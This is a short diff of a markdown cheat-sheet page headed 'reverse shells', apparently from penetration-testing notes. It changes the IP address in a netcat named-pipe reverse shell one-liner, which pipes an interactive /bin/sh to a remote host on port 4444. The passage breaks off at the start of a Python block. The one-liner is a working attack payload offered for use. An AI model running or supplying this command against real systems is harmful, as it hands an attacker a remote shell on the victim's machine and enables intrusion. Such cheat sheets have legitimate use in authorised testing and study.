@@ -1,7 +1,7 @@
 [back](../README.md)
 # reverse shells
 ```sh
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.8.104 4444 >/tmp/f
 ```
 
 ```python
